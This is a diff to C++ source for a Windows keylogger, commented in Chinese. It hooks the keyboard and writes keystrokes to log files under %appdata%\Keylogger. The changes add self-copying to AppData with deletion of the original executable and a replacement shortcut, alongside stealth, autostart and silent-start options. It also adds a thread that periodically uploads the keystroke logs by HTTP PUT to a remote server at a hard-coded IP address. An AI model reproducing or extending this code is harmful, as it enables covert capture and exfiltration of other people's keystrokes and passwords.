@@ -1,8 +1,6 @@
 #define UNICODE
 #include <winsock2.h>
 #include <ws2tcpip.h>
-#pragma comment(lib, "Ws2_32.lib")
-
 #include <windows.h>
 #include <iostream>
 #include <fstream>
@@ -12,14 +10,22 @@
 #include <regex>
 #include <algorithm>
 #include <curl/curl.h>
-#include "../../../library/json.h"
+#include <nlohmann/json.hpp>    
 #include <cstring>
 #include <cstdio>
 #include <sstream>
 #include <time.h>
 #include <map>
 #include <shlwapi.h>
+#include <shellapi.h>
+#include <atomic>
+#include <shlobj.h>          // SHGetFolderPath
+#include <objbase.h>         // CoInitialize, CoUninitialize
+#include <shobjidl.h>        // IShellLink
+#pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "Shlwapi.lib")
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "uuid.lib")
 
 using json = nlohmann::json;
 namespace fs = std::filesystem;
@@ -46,8 +52,8 @@ bool isRecording = true;
 HHOOK _hook;
 
 // 上传功能控制变量
-bool uploadEnabled = false;        // 上传功能默认关闭
-bool uploadThreadRunning = false;   // 上传线程是否运行
+std::atomic<bool> uploadEnabled{ false };
+std::atomic<bool> uploadThreadRunning{ false };
 HANDLE hUploadThread = NULL;        // 上传线程句柄
 
 // ---------------------- 前置声明 ----------------------
@@ -89,6 +95,90 @@ const std::map<int, std::string> keyname{
     {VK_CAPITAL,	"[CAPSLOCK]" },
 };
 #endif
+// 全局变量：用于存储托盘图标 ID 和窗口句柄
+static HWND g_hNotifyWnd = NULL;
+static UINT g_nNotifyId = 0;
+
+// 隐藏窗口的消息处理函数
+LRESULT CALLBACK NotifyWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+    return DefWindowProc(hWnd, msg, wParam, lParam);
+}
+
+// 初始化隐藏窗口（仅一次）
+void InitNotifyWindow()
+{
+    if (g_hNotifyWnd != NULL) return;
+    WNDCLASS wc = { 0 };
+    wc.lpfnWndProc = NotifyWndProc;
+    wc.hInstance = GetModuleHandle(NULL);
+    wc.lpszClassName = L"KeyloggerNotifyClass";
+    RegisterClass(&wc);
+    g_hNotifyWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, wc.hInstance, NULL);
+    if (g_hNotifyWnd) g_nNotifyId = (UINT)(ULONG_PTR)g_hNotifyWnd;
+}
+
+// 显示通知（气泡），失败时回退到 MessageBox
+void ShowToastNotification(const std::wstring& title, const std::wstring& content)
+{
+    InitNotifyWindow();  // 确保隐藏窗口存在
+    if (!g_hNotifyWnd)
+    {
+        MessageBox(NULL, content.c_str(), title.c_str(), MB_OK);
+        return;
+    }
+
+    NOTIFYICONDATAW nid = { sizeof(NOTIFYICONDATAW) };
+    nid.hWnd = g_hNotifyWnd;
+    nid.uID = g_nNotifyId;
+    nid.uFlags = NIF_ICON | NIF_TIP | NIF_INFO;
+    nid.dwInfoFlags = NIIF_INFO;
+    wcscpy_s(nid.szInfo, content.c_str());
+    wcscpy_s(nid.szInfoTitle, title.c_str());
+    // 使用默认图标（可从程序资源加载，此处用标准应用图标）
+    nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);
+
+    // 尝试添加图标（如果已存在，则修改）
+    if (!Shell_NotifyIconW(NIM_ADD, &nid))
+    {
+        // 如果添加失败，可能是因为已有图标，尝试修改
+        Shell_NotifyIconW(NIM_MODIFY, &nid);
+    }
+    else
+    {
+        // 新添加的图标，需要延迟删除以避免残留
+        // 启动一个线程，10秒后删除图标
+        struct DelayedCleanupData {
+            HWND hWnd;
+            UINT uID;
+        } *pData = new DelayedCleanupData{ g_hNotifyWnd, g_nNotifyId };
+        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
+            DelayedCleanupData* data = (DelayedCleanupData*)p;
+            Sleep(10000);  // 等待10秒，确保气泡显示完毕
+            NOTIFYICONDATAW delNid = { sizeof(NOTIFYICONDATAW) };
+            delNid.hWnd = data->hWnd;
+            delNid.uID = data->uID;
+            Shell_NotifyIconW(NIM_DELETE, &delNid);
+            delete data;
+            return 0;
+            }, pData, 0, NULL);
+        if (hThread) CloseHandle(hThread);
+    }
+}
+
+// 在程序退出时清理托盘图标（可选，但推荐）
+void CleanupNotifyIcon()
+{
+    if (g_hNotifyWnd)
+    {
+        NOTIFYICONDATAW nid = { sizeof(NOTIFYICONDATAW) };
+        nid.hWnd = g_hNotifyWnd;
+        nid.uID = g_nNotifyId;
+        Shell_NotifyIconW(NIM_DELETE, &nid);
+        DestroyWindow(g_hNotifyWnd);
+        g_hNotifyWnd = NULL;
+    }
+}
 
 KBDLLHOOKSTRUCT kbdStruct;
 
@@ -360,6 +450,29 @@ std::string GetDateString()
     return std::string(buf);
 }
 
+// 获取日志目录（%appdata%\Keylogger）
+std::string GetLogDirectory()
+{
+    wchar_t path[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path)))
+    {
+        std::wstring appdata(path);
+        std::wstring logDirW = appdata + L"\\Keylogger";
+        // 确保目录存在
+        if (!fs::exists(logDirW))
+        {
+            fs::create_directories(logDirW);
+        }
+        // 转换为多字节字符串
+        int size_needed = WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), NULL, 0, NULL, NULL);
+        std::string logDir(size_needed, 0);
+        WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), &logDir[0], size_needed, NULL, NULL);
+        return logDir;
+    }
+    // 如果失败，返回当前目录
+    return ".\\";
+}
+
 std::string MakeOutputFilename()
 {
     std::string ip = GetLocalIPAddress();
@@ -370,7 +483,10 @@ std::string MakeOutputFilename()
             c = '-';
     }
     std::string date = GetDateString();
-    return ip + "_" + date + ".log";
+    std::string filename = ip + "_" + date + ".log";
+    // 拼接日志目录
+    std::string logDir = GetLogDirectory();
+    return logDir + "\\" + filename;
 }
 
 // ---------- 上传功能相关函数 ----------
@@ -404,7 +520,7 @@ std::string readFileContent(const std::string& filePath) {
     return buffer;
 }
 
-// 获取程序当前执行目录
+// 获取程序当前执行目录（注意：此函数用于上传功能，此处保留）
 std::string getExecutableDir() {
     char exePath[MAX_PATH];
     DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
@@ -425,8 +541,6 @@ std::string findLatestLogFile(const std::string& dir) {
     }
 
     // 正则表达式：匹配 <IP>_<YYYYMMDD>.log 格式
-    // IP 格式：xxx.xxx.xxx.xxx（简单匹配，不严格验证 IP 合法性）
-    // 日期格式：YYYYMMDD（8位数字）
     std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
     std::smatch match;
 
@@ -457,7 +571,7 @@ std::string findLatestLogFile(const std::string& dir) {
         });
 
     // 返回最新文件的完整路径
-    return dir + validLogs[0].first;
+    return dir + "\\" + validLogs[0].first;
 }
 
 // 获取 token
@@ -507,53 +621,54 @@ std::string api_get() {
 }
 
 // 上传文件到服务器
-void uploadFile(const std::string& token, const std::string& localFilePath, const std::string& serverFilePath) {
+bool uploadFile(const std::string& token, const std::string& localFilePath, const std::string& serverFilePath)
+{
     if (token.empty()) {
         std::cerr << "token 为空，无法上传" << std::endl;
-        return;
+        return false;
     }
 
     std::string fileContent = readFileContent(localFilePath);
     if (fileContent.empty()) {
-        return;
+        return false;
     }
 
     CURL* curl = curl_easy_init();
-    if (curl) {
-        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
-        curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/fs/put");
-        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
-
-        struct curl_slist* headers = NULL;
-        headers = curl_slist_append(headers, ("Authorization: " + token).c_str());
-        headers = curl_slist_append(headers, ("File-Path: " + serverFilePath).c_str());
-        headers = curl_slist_append(headers, ("Content-Length: " + std::to_string(fileContent.size())).c_str());
-        headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
-        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fileContent.data());
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, fileContent.size());
-
-        std::string response;
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
-
-        CURLcode res = curl_easy_perform(curl);
-        if (res != CURLE_OK) {
-            std::cerr << "上传失败: " << curl_easy_strerror(res) << std::endl;
-        }
-        else {
-            std::cout << "上传响应: " << response << std::endl;
-        }
-
-        curl_easy_cleanup(curl);
-        curl_slist_free_all(headers);
-    }
-    else {
+    if (!curl) {
         std::cerr << "curl 初始化失败" << std::endl;
+        return false;
     }
-}
 
+    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
+    curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/fs/put");
+    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+
+    struct curl_slist* headers = NULL;
+    headers = curl_slist_append(headers, ("Authorization: " + token).c_str());
+    headers = curl_slist_append(headers, ("File-Path: " + serverFilePath).c_str());
+    headers = curl_slist_append(headers, ("Content-Length: " + std::to_string(fileContent.size())).c_str());
+    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fileContent.data());
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, fileContent.size());
+
+    std::string response;
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+
+    CURLcode res = curl_easy_perform(curl);
+    curl_easy_cleanup(curl);
+    curl_slist_free_all(headers);
+
+    if (res != CURLE_OK) {
+        std::cerr << "上传失败: " << curl_easy_strerror(res) << std::endl;
+        return false;
+    }
+    std::cout << "上传响应: " << response << std::endl;
+    // 可根据需要解析 response 判断是否成功，此处简单认为响应非空即成功
+    return true;
+}
 // 上传最新日志文件的封装函数
 void uploadLatestLog()
 {
@@ -561,24 +676,33 @@ void uploadLatestLog()
     std::string token = api_get();
     if (token.empty()) {
         std::cerr << "获取 token 失败，跳过上传" << std::endl;
+        ShowToastNotification(L"上传错误", L"获取登录凭证失败，已自动关闭上传功能");
+        uploadEnabled = false;
+        uploadThreadRunning = false;
         return;
     }
 
-    // 2. 获取程序执行目录
-    std::string exeDir = getExecutableDir();
-    if (exeDir.empty()) return;
+    // 2. 获取日志目录
+    std::string logDir = GetLogDirectory();
+    if (logDir.empty()) return;
 
     // 3. 查找最新的日志文件
-    std::string latestLogPath = findLatestLogFile(exeDir);
+    std::string latestLogPath = findLatestLogFile(logDir);
     if (latestLogPath.empty()) return;
 
-    // 4. 配置服务器路径（保持与本地文件名一致）
+    // 4. 配置服务器路径
     fs::path logPath(latestLogPath);
     std::string fileName = logPath.filename().string();
     std::string serverFile = "/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/log/" + fileName;
 
     // 5. 上传文件
-    uploadFile(token, latestLogPath, serverFile);
+    bool success = uploadFile(token, latestLogPath, serverFile);
+    if (!success) {
+        std::cerr << "上传失败，已自动关闭上传功能" << std::endl;
+        ShowToastNotification(L"上传错误", L"文件上传失败，已自动关闭上传功能");
+        uploadEnabled = false;
+        uploadThreadRunning = false;
+    }
 }
 
 // 上传线程函数
@@ -587,14 +711,12 @@ DWORD WINAPI UploadThreadFunc(LPVOID lpParam)
     while (uploadEnabled && uploadThreadRunning)
     {
         uploadLatestLog();
-        // 每5分钟上传一次（可根据需要调整间隔）
         for (int i = 0; i < 300 && uploadEnabled && uploadThreadRunning; ++i)
             Sleep(1000);
     }
     uploadThreadRunning = false;
     return 0;
 }
-
 // ---------- 键盘钩子回调函数 ----------
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -613,19 +735,21 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
                 if (isRecording)
                 {
                     std::cout << "录制继续\n";
-                    MessageBox(NULL, L"继续录(/≧▽≦)/", L"录制继续", MB_OK);
+                    ShowToastNotification(L"继续录(/≧▽≦)/", L"录制继续");
                 }
                 else
                 {
                     std::cout << "录制暂停\n";
-                    MessageBox(NULL, L"不录啦╰(￣ω￣ｏ)", L"录制暂停", MB_OK);
+                    ShowToastNotification(L"不录啦╰(￣ω￣ｏ)", L"录制暂停");
                 }
             }
             // Check for Ctrl + Shift + Alt + Q
             else if (kbdStruct.vkCode == 'Q' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
             {
-                MessageBox(NULL, L"真不录啦（*゜ー゜*）\n\n那拜拜啦(o゜▽゜)o☆", L"录制结束", MB_OK);
+                ShowToastNotification(L"真不录啦（*゜ー゜*）\n\n那拜拜啦(o゜▽゜)o☆", L"录制结束");
                 std::cout << "录制结束\n";
+                Sleep(2000);
+                CleanupNotifyIcon();   // 清理托盘图标
                 ReleaseHook();
                 output_file.close();
                 exit(0);
@@ -637,13 +761,13 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
                 if (SetAutoStart(!enabled))
                 {
                     if (!enabled)
-                        MessageBox(NULL, L"已设置为开机自啟 awa", L"自启设置", MB_OK);
+                        ShowToastNotification(L"已设置为开机自啟 awa", L"自启设置");
                     else
-                        MessageBox(NULL, L"已取消开机自启 qaq", L"自启设置", MB_OK);
+                        ShowToastNotification(L"已取消开机自启 qaq", L"自启设置");
                 }
                 else
                 {
-                    MessageBox(NULL, L"自启设置失败，请以管理员身份运行w", L"自启设置", MB_OK | MB_ICONERROR);
+                    ShowToastNotification(L"自启设置失败，请以管理员身份运行w", L"自启设置");
                 }
             }
             // Check for Ctrl + Shift + Alt + D (静默启动)
@@ -653,44 +777,44 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
                 if (SetSilentMode(!silent))
                 {
                     if (!silent)
-                        MessageBox(NULL, L"已设置为静默启动（下次启动不再弹窗）", L"静默启动", MB_OK);
+                        ShowToastNotification(L"已设置为静默启动（下次启动不再弹窗）", L"静默启动");
                     else
-                        MessageBox(NULL, L"已取消静默启动（下次启动会弹窗）", L"静默启动", MB_OK);
+                        ShowToastNotification(L"已取消静默启动（下次启动会弹窗）", L"静默启动");
                 }
                 else
                 {
-                    MessageBox(NULL, L"设置静默启动失败，请以管理员身份运行", L"静默启动", MB_OK | MB_ICONERROR);
+                    ShowToastNotification(L"设置静默启动失败，请以管理员身份运行", L"静默启动");
                 }
             }
             // Check for Ctrl + Shift + Alt + U (上传开关)
             else if (kbdStruct.vkCode == 'U' && (GetKeyState(VK_CONTROL) & 0x8000) &&
                 (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
             {
-                uploadEnabled = !uploadEnabled;
-                if (uploadEnabled)
+                bool newState = !uploadEnabled;
+                if (newState)
                 {
-                    // 启动上传线程（如果尚未运行）
+                    // 如果线程未运行（可能之前因错误关闭），则启动新线程
                     if (!uploadThreadRunning)
                     {
                         uploadThreadRunning = true;
                         hUploadThread = CreateThread(NULL, 0, UploadThreadFunc, NULL, 0, NULL);
                         if (hUploadThread)
-                            CloseHandle(hUploadThread); // 线程独立运行，不需要等待句柄
-                        MessageBox(NULL, L"上传功能已开启，将定期上传日志文件", L"上传开关", MB_OK);
+                            CloseHandle(hUploadThread);
+                        ShowToastNotification(L"上传开关", L"上传功能已开启，将定期上传日志文件");
                     }
                     else
                     {
-                        MessageBox(NULL, L"上传功能已开启（线程已在运行）", L"上传开关", MB_OK);
+                        ShowToastNotification(L"上传开关", L"上传功能已开启（线程已在运行）");
                     }
+                    uploadEnabled = true;
                 }
                 else
                 {
-                    // 关闭上传功能：设置标志让线程自然退出
+                    uploadEnabled = false;
                     uploadThreadRunning = false;
-                    // 可选：等待线程结束（但不强制等待，避免阻塞钩子）
                     if (hUploadThread)
                         WaitForSingleObject(hUploadThread, 5000);
-                    MessageBox(NULL, L"上传功能已关闭", L"上传开关", MB_OK);
+                    ShowToastNotification(L"上传开关", L"上传功能已关闭");
                 }
             }
             else
@@ -718,19 +842,167 @@ void SetHook()
     }
 }
 
+// ==================== 新增功能：自复制、删除原文件、创建快捷方式 ====================
+
+// 创建快捷方式（通用）
+bool CreateShortcut(const std::wstring& targetPath, const std::wstring& shortcutPath)
+{
+    // 如果快捷方式已存在，则不重复创建
+    if (fs::exists(shortcutPath))
+        return true;
+
+    CoInitialize(NULL);
+    IShellLinkW* psl = NULL;
+    IPersistFile* ppf = NULL;
+    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&psl);
+    if (SUCCEEDED(hr))
+    {
+        psl->SetPath(targetPath.c_str());
+        psl->SetDescription(L"Keyboard Logger");
+        hr = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
+        if (SUCCEEDED(hr))
+        {
+            hr = ppf->Save(shortcutPath.c_str(), TRUE);
+            ppf->Release();
+        }
+        psl->Release();
+    }
+    CoUninitialize();
+    return SUCCEEDED(hr);
+}
+
+// 处理自复制、删除原文件、创建快捷方式
+void HandleSelfCopyAndDelete()
+{
+    // 获取目标目录：%appdata%\Keylogger
+    wchar_t appdataPath[MAX_PATH];
+    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdataPath)))
+        return;
+
+    std::wstring targetDir = std::wstring(appdataPath) + L"\\Keylogger";
+    fs::create_directories(targetDir);
+
+    std::wstring currentExe = GetModulePath();
+    std::wstring targetExe = targetDir + L"\\" + fs::path(currentExe).filename().wstring();
+
+    // 如果当前程序不在目标目录，则执行复制、创建快捷方式、启动、删除
+    if (currentExe != targetExe)
+    {
+        // 复制自身到目标目录
+        if (!CopyFileW(currentExe.c_str(), targetExe.c_str(), FALSE))
+        {
+            MessageBoxW(NULL, L"复制自身到 %appdata%\\Keylogger 失败", L"错误", MB_ICONERROR);
+            return;
+        }
+
+        // 在原程序所在目录创建指向新程序的快捷方式
+        std::wstring originalDir = fs::path(currentExe).parent_path().wstring();
+        std::wstring shortcutName = fs::path(currentExe).stem().wstring() + L".lnk";
+        std::wstring shortcutPath = originalDir + L"\\" + shortcutName;
+        CreateShortcut(targetExe, shortcutPath);
+
+        // 启动新程序，传递原程序路径以便删除
+        std::wstring params = L"--delete-old \"" + currentExe + L"\"";
+        wchar_t paramsBuf[1024];
+        wcscpy_s(paramsBuf, params.c_str());
+
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        if (CreateProcessW(targetExe.c_str(), paramsBuf, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+        {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            ExitProcess(0);   // 当前进程退出
+        }
+        else
+        {
+            MessageBoxW(NULL, L"启动副本失败", L"错误", MB_ICONERROR);
+        }
+    }
+    else
+    {
+        // 已经在目标目录，检查是否有删除旧文件的任务
+        int argc;
+        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
+        if (argc >= 3 && wcscmp(argv[1], L"--delete-old") == 0)
+        {
+            std::wstring oldPath = argv[2];
+            // 等待原程序完全退出（增加延迟）
+            Sleep(5000);  // 5秒，足够原进程退出
+
+            // 尝试删除，重试多次
+            bool deleted = false;
+            DWORD lastError = 0;
+            for (int i = 0; i < 10; ++i)
+            {
+                // 检查文件是否存在
+                if (!fs::exists(oldPath))
+                {
+                    deleted = true;
+                    break;
+                }
+
+                // 移除只读属性（如果有）
+                SetFileAttributesW(oldPath.c_str(), FILE_ATTRIBUTE_NORMAL);
+
+                // 尝试删除
+                if (DeleteFileW(oldPath.c_str()))
+                {
+                    deleted = true;
+                    break;
+                }
+
+                lastError = GetLastError();
+                // 如果文件被占用，等待重试
+                if (lastError == ERROR_SHARING_VIOLATION || lastError == ERROR_ACCESS_DENIED)
+                {
+                    Sleep(1000);
+                    continue;
+                }
+                else
+                {
+                    // 其他错误，跳出重试
+                    break;
+                }
+            }
+
+            if (!deleted)
+            {
+                // 如果常规删除失败，尝试延迟删除（重启后删除）
+                if (!MoveFileExW(oldPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT))
+                {
+                    lastError = GetLastError();
+                    wchar_t msg[512];
+                    wsprintfW(msg, L"删除原程序失败，错误码：%lu\n路径：%s\n已设置延迟删除（重启后生效）", lastError, oldPath.c_str());
+                    MessageBoxW(NULL, msg, L"删除错误", MB_ICONERROR);
+                }
+                else
+                {
+                    // 延迟删除成功，通知用户
+                    MessageBoxW(NULL, L"原程序将在下次重启时被删除。", L"提示", MB_ICONINFORMATION);
+                }
+            }
+        }
+        if (argv) LocalFree(argv);
+    }
+}
+// ==================== 主函数 ====================
 int main()
 {
+    // 首先处理自复制与删除旧文件（必须在 Stealth 之前，因为可能涉及退出进程）
+    HandleSelfCopyAndDelete();
+
     Stealth();
 
     // 静默模式提示（如果未开启静默模式则显示启动提示）
     if (!IsSilentMode()) {
-        MessageBox(NULL, L"开录 q(≧▽≦q)\n\n快捷键小提示ww\n"
+        MessageBoxW(NULL, L"开录 q(≧▽≦q)\n\n快捷键小提示ww\n"
             L"Ctrl + Shift + Alt + P  暂停录制\n"
             L"Ctrl + Shift + Alt + Q  结束录制\n"
             L"Ctrl + Shift + Alt + S  设置/取消开机自启\n"
             L"Ctrl + Shift + Alt + D  设置/取消静默启动\n"
             L"Ctrl + Shift + Alt + U  开启/关闭上传功能\n\n"
-            L"录制日志将保存在当前目录，文件名 ip_日期.log",
+            L"录制日志将保存在 %appdata%\\Keylogger 目录，文件名 ip_日期.log",
             L"录制开始", MB_OK);
     }
 
@@ -745,10 +1017,13 @@ int main()
     std::cout << "跳过系统启动检查。\n";
 #endif
 
+    // 确保日志目录存在
+    GetLogDirectory();
+
     std::string output_filename = MakeOutputFilename();
     std::cout << "输出日志到 " << output_filename << std::endl;
 
-    output_file.open(output_filename, std::ios_base::app);
+    output_file.open(output_filename, std::ios_base::app | std::ios::binary);
 
     SetHook();
 
@@ -756,7 +1031,7 @@ int main()
     while (GetMessage(&msg, NULL, 0, 0))
     {
     }
-
+    CleanupNotifyIcon();
     ReleaseHook();
     output_file.close();
     return 0;
